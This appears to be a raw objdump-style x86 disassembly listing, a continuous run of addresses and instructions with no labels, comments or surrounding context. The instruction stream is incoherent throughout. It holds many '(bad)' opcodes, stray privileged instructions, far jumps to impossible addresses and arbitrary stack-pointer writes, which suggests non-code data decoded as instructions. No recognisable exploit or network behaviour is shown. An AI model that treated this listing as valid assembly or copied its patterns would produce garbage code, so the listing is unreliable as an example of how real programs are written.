  430f3f:	mov    eax,0xf8028b
  430f44:	jne    0x430f07
  430f46:	mov    esi,ecx
  430f48:	mov    esp,DWORD PTR [ebp+0x2c]
  430f4b:	add    edi,DWORD PTR [ebp-0x24]
  430f4e:	sub    esp,eax
  430f50:	and    al,0x45
  430f52:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f58:	sbb    al,0xee
  430f5a:	pop    esi
  430f5b:	call   0x830f8b
  430f60:	fsubr  st,st(3)
  430f62:	sti    
  430f63:	add    BYTE PTR gs:[ecx],bh
  430f66:	add    eax,esp
  430f68:	add    DWORD PTR [esi],eax
  430f6a:	rol    DWORD PTR [ebp+0x8],0x29
  430f6e:	mov    esp,eax
  430f70:	clc    
  430f71:	jne    0x430fe8
  430f73:	mov    eax,0x8b0673
  430f78:	loopne 0x430fbf
  430f7a:	loopne 0x430f05
  430f7c:	lods   al,BYTE PTR ds:[esi]
  430f7d:	int3   
  430f7e:	inc    ebp
  430f7f:	mov    DWORD PTR gs:[eax+edi*8],eax
  430f83:	add    al,0xc3
  430f85:	sub    ecx,DWORD PTR [ebp+0x47]
  430f88:	(bad)  
  430f8a:	shr    BYTE PTR [ebp-0x1f],0xe8
  430f8e:	add    eax,DWORD PTR [eax]
  430f90:	call   0x644d095
  430f95:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430f9b:	dec    esi
  430f9c:	ins    DWORD PTR es:[edi],dx
  430f9d:	in     al,dx
  430f9e:	lea    eax,[eax]
  430fa0:	inc    ebp
  430fa1:	inc    ebp
  430fa2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fa8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fb2:	and    al,0xdc
  430fb4:	ror    DWORD PTR [edx+0x24],0xf7
  430fb8:	or     BYTE PTR [ebp+0x4c],dh
  430fbb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fbf:	stos   BYTE PTR es:[edi],al
  430fc0:	adc    edx,edi
  430fc2:	inc    esp
  430fc3:	add    edi,DWORD PTR [eax]
  430fc5:	jne    0x430faa
  430fc7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430fcd:	cmp    ecx,DWORD PTR [edi]
  430fcf:	sub    BYTE PTR [ebp-0x7e],dl
  430fd2:	sar    ebp,0xb
  430fd5:	jmp    FWORD PTR [edi+0x2400392a]
  430fdb:	sub    esi,DWORD PTR [ebx-0x73]
  430fde:	mov    esp,DWORD PTR [ecx+edi*4]
  430fe1:	mov    ecx,DWORD PTR [eax]
  430fe3:	and    BYTE PTR [eax],al
  430fe5:	jne    0x430fb1
  430fe7:	sub    ebp,ecx
  430fe9:	sbb    BYTE PTR [esi+0x32],ah
  430fec:	dec    ebp
  430fed:	push   ebp
  430fee:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  430ff4:	ret    
  430ff5:	mov    edx,ebp
  430ff7:	leave  
  430ff8:	sub    DWORD PTR [esi+0x24],ebx
  430ffb:	ret    0x2b
  430ffe:	pop    ax
  431000:	push   ebp
  431001:	rol    BYTE PTR [ebx],0xeb
  431004:	add    DWORD PTR [ecx+0x6c0001],0x40
  43100b:	jb     0x431062
  43100d:	ret    
  43100e:	in     al,dx
  43100f:	jecxz  0x430f9c
  431011:	push   esi
  431012:	xchg   esp,eax
  431013:	jne    0x431015
  431015:	cmp    edx,DWORD PTR [esi+0x1c]
  431018:	jne    0x430ffe
  43101a:	mov    eax,DWORD PTR [ebp-0x77]
  43101d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431024:	mov    esi,DWORD PTR [ebp-0x75]
  431027:	pop    esi
  431028:	nop
  431029:	mov    eax,DWORD PTR [eax]
  43102b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431031:	add    al,0x0
  431033:	inc    ebp
  431034:	mov    eax,DWORD PTR [ebx]
  431036:	mov    ebp,ebx
  431038:	cmp    al,0xf
  43103a:	or     al,al
  43103c:	inc    ebp
  43103d:	inc    ebp
  43103e:	xor    eax,0x8bc89c8b
  431043:	ins    BYTE PTR es:[edi],dx
  431044:	cld    
  431045:	add    BYTE PTR [edi+0x536c16c0],dh
  43104b:	add    BYTE PTR [ecx-0x5],dl
  43104e:	add    eax,0x17200
  431053:	sbb    al,0x85
  431055:	dec    esp
  431056:	je     0x431090
  431058:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43105c:	add    BYTE PTR [ebx],bh
  43105e:	(bad)  
  43105f:	and    al,0x34
  431061:	jae    0x430fff
  431063:	mov    cl,cl
  431065:	inc    DWORD PTR [esp]
  431068:	push   ebp
  431069:	shr    esp,0x8
  43106c:	in     al,dx
  43106d:	push   esp
  43106e:	add    DWORD PTR [eax],esp
  431070:	add    bl,cl
  431072:	inc    ebp
  431073:	mov    bh,0x89
  431075:	add    ah,bh
  431077:	jmp    0xca771fc1
  43107c:	pushf  
  43107d:	dec    esp
  43107e:	push   ebx
  43107f:	and    BYTE PTR [ebp+0x17],al
  431082:	xor    eax,0x56009cd9
  431087:	add    BYTE PTR [ebp+0x2b],al
  43108a:	in     eax,0xc1
  43108c:	inc    ebp
  43108d:	add    eax,0xc601d8
  431092:	mov    al,0xc6
  431095:	ins    BYTE PTR es:[edi],dx
  431096:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43109d:	dec    esp
  43109e:	xor    esp,DWORD PTR [eax]
  4310a0:	(bad)  
  4310a1:	fxch   st(1)
  4310a3:	sub    DWORD PTR [ebx],esi
  4310a5:	add    BYTE PTR [edx-0x40],bl
  4310a8:	mov    eax,0x248d8d00
  4310ae:	xor    eax,0x188b0fc3
  4310b3:	push   ecx
  4310b4:	fimul  DWORD PTR [edx+0x8801d9]
  4310ba:	or     DWORD PTR [ebx+0x36ed0806],0x45
  4310c1:	xor    ebx,ebp
  4310c3:	mov    al,BYTE PTR [ebp+0x1]
  4310c6:	jmp    0xdb4c55cb
  4310cb:	mov    dl,0x45
  4310cd:	add    esi,ebp
  4310cf:	add    BYTE PTR [ebp+0xe],al
  4310d2:	sub    DWORD PTR [edx+0x2e0145],eax
  4310d8:	inc    ebp
  4310d9:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  4310dd:	add    eax,DWORD PTR [edi+eax*8-0x24]
  4310e1:	cld    
  4310e2:	mov    dh,0xa5
  4310e4:	xor    edi,eax
  4310e6:	add    eax,DWORD PTR [ebp+0x46]
  4310e9:	prefetcht0 BYTE PTR [ecx-0x2]
  4310ed:	xor    eax,0x7c60872
  4310f2:	mov    esp,0xbd32c69a
  4310f7:	pop    esi
  4310f8:	mov    cl,0xbe
  4310fb:	or     al,0xc6
  4310fd:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431104:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43110b:	add    dh,al
  43110d:	mov    eax,ebx
  43110f:	xor    DWORD PTR [ebx],0x35008dbc
  431115:	mov    ecx,DWORD PTR [edi]
  431117:	sbb    al,0x18
  431119:	inc    ebp
  43111a:	fcmovb st,st(7)
  43111c:	fxtract 
  43111e:	mov    BYTE PTR [ebp-0x38f7077d],al
  431124:	in     eax,dx
  431125:	call   0xf94296af
  43112a:	inc    esi
  43112c:	inc    ebp
  43112d:	les    ecx,FWORD PTR [ebx-0x103a273a]
  431133:	push   edi
  431134:	adc    eax,DWORD PTR [ebp-0x77]
  431137:	out    0x8b,eax
  431139:	inc    ebp
  43113a:	cmp    BYTE PTR [ecx],ch
  43113c:	inc    DWORD PTR [ebp+0x3b]
  43113f:	inc    ebp
  431140:	jne    0x431170
  431142:	(bad)  
  431143:	(bad)  
  431144:	mov    eax,0xf87c8545
  431149:	test   BYTE PTR [ebp-0x47],0xea
  43114d:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  431154:	xor    BYTE PTR [esi+0x3003301],0x38
  43115b:	inc    esi
  43115c:	test   DWORD PTR [eax],ebx
  43115e:	add    bh,dh
  431160:	add    BYTE PTR [edx+0x45],dh
  431163:	(bad)  
  431164:	mov    ebx,esp
  431166:	jl     0x43112e
  431168:	add    ch,bl
  43116a:	mov    esi,eax
  43116c:	mov    ebx,esi
  43116e:	cld    
  43116f:	mov    BYTE PTR [eax+0xc601df],0xe0
  431176:	cmp    dh,al
  431178:	imul   esp,ecx,0xe28dc600
  43117e:	shl    DWORD PTR [ebx],1
  431180:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431186:	mov    ebx,DWORD PTR [eax]
  431188:	data16 fiadd DWORD PTR [ebp-0x770027]
  43118f:	add    eax,0x7
  431192:	in     ax,dx
  431194:	test   DWORD PTR [ebp-0x1],eax
  431197:	jmp    0xe48a579b
  43119c:	inc    bp
  43119e:	test   eax,esp
  4311a0:	inc    DWORD PTR [ebp-0x1]
  4311a3:	cmc    
  4311a4:	rol    BYTE PTR [ebp+0x66],0xdf
  4311a8:	test   DWORD PTR [ebp-0x1],eax
  4311ab:	in     al,dx
  4311ac:	inc    DWORD PTR [ebp+0x47]
  4311af:	out    0x66,eax
  4311b1:	inc    ebp
  4311b2:	test   DWORD PTR [edi+edi*8-0xa],edi
  4311b6:	inc    DWORD PTR [eax+eax*8-0x44]
  4311ba:	data16 mov dh,0x85
  4311bd:	xor    edi,edi
  4311bf:	add    edi,edi
  4311c1:	inc    esi
  4311c2:	inc    edi
  4311c3:	sbb    BYTE PTR [esi-0x2],ah
  4311c6:	test   DWORD PTR [edx-0x1],esi
  4311c9:	(bad)  
  4311ca:	(bad)  
  4311cb:	cmp    bh,al
  4311cd:	dec    DWORD PTR [ecx-0x278b77]
  4311d3:	dec    ebp
  4311d4:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  4311db:	add    edi,edi
  4311dd:	lea    edi,[eax+0xff99ff]
  4311e3:	enter  0xe89,0x78
  4311e7:	inc    ebp
  4311e8:	push   DWORD PTR ds:0xc7829cb8
  4311ee:	add    BYTE PTR [eax-0x7857a77],bh
  4311f4:	inc    DWORD PTR [ebp-0x48]
  4311f7:	mov    edx,edi
  4311f9:	mov    WORD PTR [eax],es
  4311fb:	add    BYTE PTR [ecx-0xf083c7],cl
  431201:	pop    edi
  431202:	add    DWORD PTR [eax],0xffffffe4
  431205:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43120b:	add    DWORD PTR [eax+0x382700],edi
  431211:	inc    ebp
  431212:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431218:	add    BYTE PTR [ecx+0x4f45b866],cl
  43121e:	lea    eax,[eax]
  431220:	add    eax,0x89660878
  431225:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  43122c:	loopne 0x4311b7
  43122e:	(bad)  
  43122f:	data16 aam 0xff
  431232:	in     al,dx
  431233:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  431238:	pop    ecx
  431239:	push   0x8ddaff18
  43123e:	jmp    0x43123f
  431240:	mov    BYTE PTR [ecx-0x8a95c0],cl
  431246:	lea    eax,[ebx-0x767aee30]
  43124c:	(bad)  
  43124d:	ins    BYTE PTR es:[edi],dx
  43124e:	(bad)  
  43124f:	inc    DWORD PTR [ebp-0xfb0173]
  431255:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  43125b:	adc    DWORD PTR [ecx+0x3d],0x33
  43125f:	mov    DWORD PTR [ebx+0xff7270],edi
  431265:	(bad)  
  431266:	ret    
  431267:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  43126d:	call   DWORD PTR [eax-0x75]
  431270:	inc    ebp
  431271:	mov    ax,WORD PTR [ebp-0xff0068]
  431278:	mov    eax,0x85ff66b0
  43127e:	add    edi,edi
  431280:	add    bh,bh
  431282:	(bad)  
  431283:	stc    
  431284:	inc    DWORD PTR [eax]
  431286:	or     BYTE PTR [esi+0x45],ah
  431289:	test   DWORD PTR [ebp-0x7e008a01],eax
  43128f:	outs   dx,BYTE PTR ds:[esi]
  431290:	pop    DWORD PTR [eax]
  431292:	adc    ah,BYTE PTR [esi-0x78]
  431295:	test   DWORD PTR [eax-0x1],esi
  431298:	mov    ecx,0x6b4fff
  43129d:	add    cl,al
  43129f:	mov    WORD PTR [ebp-0x3f0078],ax
  4312a6:	mov    eax,eax
  4312a8:	data16 push bp
  4312ab:	test   DWORD PTR [ebp-0x76000201],ecx
  4312b1:	dec    esp
  4312b2:	mov    WORD PTR [eax],es
  4312b4:	ret    0x6666
  4312b7:	inc    ebp
  4312b8:	push   ebp
  4312b9:	mov    eax,0xf3478d
  4312be:	mov    DWORD PTR [ecx+0x47c28290],ecx
  4312c4:	pushw  0x55
  4312c7:	lea    ax,[ebp-0x1f]
  4312cb:	(bad)  
  4312cc:	mov    eax,edx
  4312ce:	xchg   esp,eax
  4312cf:	in     al,0x89
  4312d1:	cmc    
  4312d2:	xchg   esi,eax
  4312d3:	inc    ebp
  4312d4:	iret   
  4312d5:	fisttp WORD PTR [ecx+0x4a8d98e7]
  4312db:	ror    BYTE PTR [ebx+0x5532668a],1
  4312e1:	or     BYTE PTR [ebx+0x55186639],0x49
  4312e8:	(bad)  
  4312e9:	repz cmp eax,0xa0898945
  4312ef:	mov    ah,0x89
  4312f1:	jmp    DWORD PTR [edx+0x66b0418d]
  4312f7:	inc    DWORD PTR [ebp+0x50]
  4312fa:	add    DWORD PTR [ebp-0xd],0xffffffbe
  4312fe:	mov    DWORD PTR [eax],ecx
  431300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431301:	pop    es
  431302:	inc    ecx
  431303:	(bad)  
  431304:	call   0x366:0x3245
  43130a:	dec    ebp
  43130b:	push   eax
  43130c:	inc    bp
  43130e:	jge    0x431293
  431310:	mov    esp,DWORD PTR [esi-0x18]
  431313:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431319:	add    DWORD PTR [ebx],esi
  43131b:	add    BYTE PTR [ebx],al
  43131d:	test   DWORD PTR [ebx],esi
  43131f:	(bad)  
  431320:	inc    WORD PTR [ebp+0x0]
  431324:	mov    eax,DWORD PTR [eax]
  431326:	call   0x8898ca5b
  43132b:	mov    esi,eax
  43132d:	clc    
  43132e:	ret    
  43132f:	rol    cl,0xa
  431332:	mov    DWORD PTR ds:0x7c0ec88,esi
  431338:	mov    edx,edi
  43133a:	pushf  
  43133b:	pop    es
  43133c:	jmp    DWORD PTR [edx+0x66]
  43133f:	add    BYTE PTR [ebp-0x990175],al
  431345:	inc    ebp
  431346:	test   DWORD PTR [ebx-0x2f00ea02],eax
  43134c:	push   ebp
  43134d:	mov    edi,eax
  43134f:	mov    dh,BYTE PTR [eax+0x266ff51]
  431355:	push   ebp
  431356:	add    BYTE PTR [ebx-0x764b0777],al
  43135c:	dec    DWORD PTR [esi+0x661851e8]
  431362:	add    BYTE PTR [ebp-0x7b],dl
  431365:	cmp    esi,0xfffffff3
  431368:	dec    DWORD PTR [ecx+0x51fe9285]
  43136e:	jmp    DWORD PTR [esi-0x75]
  431371:	push   ebp
  431372:	hlt    
  431373:	data16 (bad) 
  431375:	dec    ebp
  431376:	ret    
  431377:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  43137d:	lea    edx,[eax-0x1]
  431380:	jne    0x431353
  431382:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431388:	dec    BYTE PTR [ecx+0x51559eff]
  43138e:	mov    DWORD PTR [esi-0x4c],esp
  431391:	push   ebp
  431392:	jmp    DWORD PTR [esi-0x18]
  431395:	inc    ebp
  431396:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43139c:	(bad)  
  43139d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43139e:	inc    eax
  4313a0:	test   DWORD PTR [esi-0x2],esp
  4313a3:	inc    ebp
  4313a4:	dec    DWORD PTR [ebp-0x760bde75]
  4313aa:	(bad)  
  4313ab:	test   al,0xc3
  4313ad:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313b3:	lods   al,BYTE PTR ds:[esi]
  4313b4:	push   eax
  4313b5:	inc    ebp
  4313b6:	jne    0x4313c7
  4313b8:	dec    DWORD PTR [ebp+0x8]
  4313bb:	mov    eax,DWORD PTR [ebx]
  4313bd:	sbb    al,0x0
  4313bf:	(bad)  
  4313c0:	mov    eax,0xc14fc3
  4313c5:	mov    DWORD PTR [eax-0x64],edi
  4313c8:	inc    bp
  4313ca:	test   DWORD PTR [edi],ecx
  4313cc:	dec    DWORD PTR [ebp-0x1]
  4313cf:	xor    eax,edi
  4313d1:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4313d7:	inc    ebp
  4313d8:	xor    DWORD PTR [ebx],0x3f
  4313db:	mov    WORD PTR [ebp-0x1bc],ax
  4313e2:	lea    ecx,[ecx-0x767702]
  4313e8:	inc    esi
  4313e9:	(bad)  
  4313ea:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4313f1:	pushf  
  4313f2:	rol    DWORD PTR [ebp-0x72019a],0xff
  4313f9:	add    bh,bh
  4313fb:	add    BYTE PTR [edi],cl
  4313fd:	test   DWORD PTR [eax],eax
  4313ff:	(bad)  
  431400:	dec    WORD PTR [ebp-0xff0031]
  431407:	mov    DWORD PTR [ecx-0xb748],ecx
  43140d:	lea    eax,[ebx+0x7cffc1b0]
  431413:	push   eax
  431414:	add    BYTE PTR [ebp+0x66],al
  431417:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43141d:	test   eax,esi
  43141f:	(bad)  
  431420:	fdiv   st(7),st
  431422:	add    bh,bh
  431424:	data16 clc 
  431426:	lea    edx,[ebp-0x1]
  431429:	(bad)  
  43142a:	dec    DWORD PTR [eax-0x72b50077]
  431430:	dec    DWORD PTR [eax-0x1237a73]
  431436:	(bad)  
  431437:	(bad)  
  431438:	(bad)  
  431439:	cdq    
  43143a:	inc    DWORD PTR [eax]
  43143c:	ja     0x4313c7
  43143e:	lea    edi,[eax-0x72000050]
  431444:	push   ecx
  431445:	mov    al,0x4d
  431447:	jmp    DWORD PTR [esi+0x50]
  43144a:	mov    ch,0x45
  43144c:	push   DWORD PTR [ebx]
  43144e:	inc    DWORD PTR [ebx]
  431450:	push   ebx
  431451:	push   eax
  431452:	push   ecx
  431453:	test   DWORD PTR [ebx],esi
  431455:	(bad)  
  431456:	mov    ebx,0xff72ff
  43145b:	clc    
  43145c:	retf   
  43145d:	push   ebp
  43145e:	(bad)  
  43145f:	jmp    0x14215a4
  431464:	push   ecx
  431465:	jae    0x431427
  431467:	add    BYTE PTR [ebp-0x38bb73],cl
  43146d:	mov    DWORD PTR [ecx+0x40],edx
  431470:	(bad)  
  431471:	(bad)  
  431472:	cld    
  431473:	mov    eax,DWORD PTR [ebp-0x7a019a]
  431479:	inc    DWORD PTR [ebp-0x3f0101]
  43147f:	inc    bp
  431481:	test   DWORD PTR [ebx+0xff98ff],ecx
  431487:	inc    edi
  431488:	(bad)  
  431489:	dec    si
  43148b:	test   edi,edi
  43148d:	(bad)  
  43148e:	cmp    eax,0xc74f7bff
  431493:	mov    edx,DWORD PTR [edx-0x7d]
  431496:	(bad)  
  431497:	mov    ebx,0x563a8931
  43149c:	(bad)  
  43149d:	call   FWORD PTR [esi-0x47]
  4314a0:	inc    DWORD PTR ds:0x893c00e2
  4314a6:	mov    DWORD PTR [eax-0x4c],ebx
  4314a9:	(bad)  
  4314aa:	jmp    DWORD PTR [esi-0x1]
  4314ad:	test   edi,edi
  4314af:	dec    DWORD PTR [eax]
  4314b1:	(bad)  
  4314b2:	inc    eax
  4314b4:	or     BYTE PTR [ecx+0x8b5745],bh
  4314ba:	sbb    al,0x89
  4314bc:	rcr    BYTE PTR [edx-0x7c],0xff
  4314c0:	add    ecx,DWORD PTR [ebx+0x6165b900]
  4314c6:	add    BYTE PTR [eax],al
  4314c8:	inc    ebp
  4314c9:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  4314cf:	data16 fdiv DWORD PTR [ebp-0x7007b]
  4314d6:	inc    ebp
  4314d7:	dec    ebp
  4314d8:	cmp    DWORD PTR [ecx-0x38b764],ecx
  4314de:	lock lea eax,[ebp+0x458df81c]
  4314e5:	(bad)  
  4314e6:	xor    eax,0x8b8b9fff
  4314eb:	hlt    
  4314ec:	cld    
  4314ed:	mov    DWORD PTR [eax+0xff014c],eax
  4314f3:	mov    esi,0x78b0845
  4314f8:	cld    
  4314f9:	into   
  4314fa:	dec    ebp
  4314fb:	call   0x5100:0x38c328b
  431502:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431508:	add    BYTE PTR [ebx],dh
  43150a:	mov    DWORD PTR [eax-0x1c],eax
  43150d:	lea    edi,[ebp-0x2]
  431510:	test   edi,edi
  431512:	jne    0x431564
  431514:	push   DWORD PTR [ebp+0x18]
  431517:	mov    DWORD PTR [ebp+0x44],edx
  43151a:	call   0xffcd101e
  43151f:	mov    al,0x45
  431521:	dec    DWORD PTR [ebx+0x3fc8b8b]
  431527:	cmp    BYTE PTR [ecx+eax*1],0xf
  43152b:	add    BYTE PTR [ebp-0x7b],al
  43152e:	test   edi,edi
  431530:	je     0x431531
  431532:	dec    DWORD PTR [edi-0x4]
  431535:	dec    edi
  431536:	or     al,BYTE PTR [ebp-0x740001]
  43153c:	cld    
  43153d:	dec    edi
  43153e:	or     BYTE PTR [edi+0x1],0x85
  431542:	add    bh,bh
  431544:	add    bh,bh
  431546:	(bad)  
  431547:	icebp  
  431548:	ret    
  431549:	dec    edi
  43154a:	inc    ebp
  43154b:	xchg   ebp,eax
  43154c:	jne    0x43154c
  43154e:	mov    edi,edi
  431550:	cld    
  431551:	xor    BYTE PTR [ecx+0x500155],cl
  431557:	push   ebp
  431558:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43155e:	add    BYTE PTR [ebp+0x35e90f50],al
  431564:	add    al,BYTE PTR [eax]
  431566:	add    BYTE PTR [ebx-0x38fe4f80],al
  43156c:	add    ah,ch
  43156e:	or     BYTE PTR [ebp+0x4501f845],dh
  431574:	jmp    0xdf186e
  431579:	(bad)  
  43157a:	nop    ecx
  43157d:	test   DWORD PTR [ebp+0x4502f8],eax
  431583:	cmp    ecx,DWORD PTR [ebp-0x64]
  431586:	mov    eax,edi
  431588:	mov    ebx,DWORD PTR [eax+edx*2]
  43158b:	add    eax,0x45fef885
  431590:	dec    DWORD PTR [ebx+0x339445]
  431596:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43159c:	dec    DWORD PTR [ebx-0x460f0375]
  4315a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315a3:	add    esi,edi
  4315a5:	add    bh,bh
  4315a7:	rdpmc  
  4315a9:	add    BYTE PTR [ebx],0x1
  4315ac:	mov    DWORD PTR [eax],eax
  4315ae:	add    al,0x45
  4315b0:	dec    DWORD PTR [ecx-0x360b3373]
  4315b6:	dec    DWORD PTR [esi]
  4315b8:	push   eax
  4315b9:	jne    0x431600
  4315bb:	mov    esi,DWORD PTR [ebx]
  4315bd:	cld    
  4315be:	add    ebp,ebp
  4315c0:	push   eax
  4315c1:	inc    DWORD PTR [ebp-0x75]
  4315c4:	add    eax,0x800e4
  4315c9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4315cf:	mov    DWORD PTR [ecx],eax
  4315d1:	sbb    al,0x0
  4315d3:	leave  
  4315d4:	test   DWORD PTR [edi-0x2],eax
  4315d7:	jne    0x4315d8
  4315d9:	call   0xff4400de
  4315de:	xor    BYTE PTR [ebp+0x4d],al
  4315e1:	mov    edi,edi
  4315e3:	enter  0x8,0x4d
  4315e7:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4315ed:	mov    eax,DWORD PTR [eax]
  4315ef:	cld    
  4315f0:	add    DWORD PTR [ecx],ebx
  4315f2:	inc    ebp
  4315f3:	dec    ebp
  4315f4:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4315fa:	inc    eax
  4315fb:	dec    DWORD PTR [ecx-0x270375]
  431601:	add    BYTE PTR [ebx-0x39d72701],cl
  431607:	xchg   ecx,eax
  431608:	ret    
  431609:	add    BYTE PTR [ebp-0x830075],al
  43160f:	add    BYTE PTR [ebp-0x75],al
  431612:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431618:	lea    edi,[edi-0xc]
  43161b:	add    bh,bh
  43161d:	mov    edx,DWORD PTR [eax-0x7b]
  431620:	inc    ebp
  431621:	rdpmc  
  431623:	jne    0x431628
  431625:	add    BYTE PTR [eax-0x75],dl
  431628:	inc    ebp
  431629:	clc    
  43162a:	add    eax,0x400009
  43162f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431635:	mov    eax,DWORD PTR [ecx]
  431637:	in     al,dx
  431638:	add    dh,al
  43163a:	test   ebx,eax
  43163c:	inc    BYTE PTR [ebp-0xff0001]
  431642:	add    BYTE PTR [ebp-0x43],al
  431645:	cmp    esi,0xfffffff8
  431648:	(bad)  
  431649:	push   DWORD PTR [eax]
  43164b:	add    BYTE PTR [ebp-0x3a],dl
  43164e:	test   ebx,eax
  431650:	je     0x4315d7
  431652:	mov    edi,edi
  431654:	sbb    al,0xff
  431656:	test   DWORD PTR gs:[eax],eax
  431659:	(bad)  
  43165a:	js     0x43165b
  43165c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  431662:	sub    eax,ebx
  431664:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43166a:	add    eax,DWORD PTR [eax]
  43166c:	dec    ebp
  43166d:	push   eax
  43166e:	mov    al,BYTE PTR [ebp+0x1]
  431671:	mov    eax,DWORD PTR [ebp-0x68]
  431674:	mov    eax,DWORD PTR [eax]
  431676:	sbb    bh,al
  431678:	or     ah,dh
  43167a:	dec    ebp
  43167b:	inc    DWORD PTR [eax+0x4]
  43167e:	push   ecx
  43167f:	add    BYTE PTR [edx-0x1],dh
  431682:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431688:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431692:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431698:	push   ecx
  431699:	cmp    BYTE PTR [ebx],al
  43169b:	inc    ebp
  43169c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316a2:	(bad)  
  4316a3:	(bad)  
  4316a4:	in     al,0xff
  4316a6:	add    BYTE PTR [ebp+0x0],al
  4316a9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316af:	add    al,bh
  4316b1:	(bad)  
  4316b2:	jmp    0x8d85:0x74b0558d
  4316b9:	dec    DWORD PTR [eax]
  4316bb:	call   DWORD PTR [ebp-0x7b]
  4316be:	mov    edi,esi
  4316c0:	lock call DWORD PTR [ebp-0x75]
  4316c4:	mov    esi,esp
  4316c6:	mov    ah,0xc6
  4316c8:	mov    bh,0xc3
  4316ca:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4316d0:	add    DWORD PTR [eax],0x450050ff
  4316d6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4316dc:	inc    edi
  4316de:	push   esp
  4316e0:	jmp    0xcd00:0x660481ff
  4316e7:	mov    DWORD PTR [ebx],esi
  4316e9:	clc    
  4316ea:	cmp    edi,0xff9cff3a
  4316f0:	jne    0x4316fa
  4316f2:	mov    eax,eax
  4316f4:	add    esi,DWORD PTR [eax]
  4316f6:	int3   
  4316f7:	inc    ebp
  4316f8:	cmp    al,0x83
  4316fa:	add    BYTE PTR [eax],bl
  4316fc:	adc    DWORD PTR [ebx+0x768b5055],eax
  431702:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431708:	mov    edi,eax
  43170a:	cmp    BYTE PTR [ebp+0x45],cl
  43170d:	jmp    0x43169a
  43170f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431712:	inc    ebp
  431713:	or     al,0x2
  431715:	dec    DWORD PTR [ebp+0x18]
  431718:	jne    0x43176f
  43171a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431720:	mov    edi,DWORD PTR [ebx]
  431722:	in     al,0x50
  431724:	xchg   ecx,eax
  431725:	jmp    0x343662a
  43172a:	adc    al,0x8b
  43172c:	inc    ebp
  43172d:	mov    al,ds:0x8b04008b
  431732:	push   ebp
  431733:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431739:	push   ebp
  43173a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431740:	inc    ebp
  431741:	dec    ebp
  431742:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431748:	mov    DWORD PTR [eax],0xe9ff00f4
  43174e:	add    al,0x0
  431750:	add    BYTE PTR [eax],al
  431752:	mov    eax,edx
  431754:	push   eax
  431755:	rol    DWORD PTR [ebp-0xf0177],1
  43175b:	bound  eax,QWORD PTR [ebp+0x50]
  43175e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431764:	add    BYTE PTR [ecx+0x558df0ff],cl
  43176a:	mov    al,0xf
  43176c:	test   DWORD PTR [edx],edx
  43176e:	call   DWORD PTR [ebp-0x7a0001]
  431774:	(bad)  
  431775:	loop   0x431776
  431777:	jnp    0xc6990b7d
  43177d:	mov    eax,ebx
  43177f:	cmp    al,0x8b
  431781:	(bad)  
  431782:	cld    
  431783:	shr    esi,0xc
  431786:	add    dl,al
  431788:	push   eax
  431789:	lea    eax,[ebp-0x1]
  43178c:	mov    edx,esi
  43178e:	cwde   
  43178f:	cli    
  431790:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431796:	or     BYTE PTR [eax],cl
  431798:	inc    ebp
  431799:	dec    ebp
  43179a:	inc    DWORD PTR [ebx+0x74803914]
  4317a0:	add    DWORD PTR [ebx+0x451800],ecx
  4317a6:	call   DWORD PTR [eax+edx*1]
  4317a9:	add    ecx,DWORD PTR [ebp-0x34]
  4317ac:	push   edi
  4317ad:	adc    al,0x8
  4317af:	mov    edx,DWORD PTR [ebp-0x14]
  4317b2:	mov    ecx,DWORD PTR [ebp+0x18]
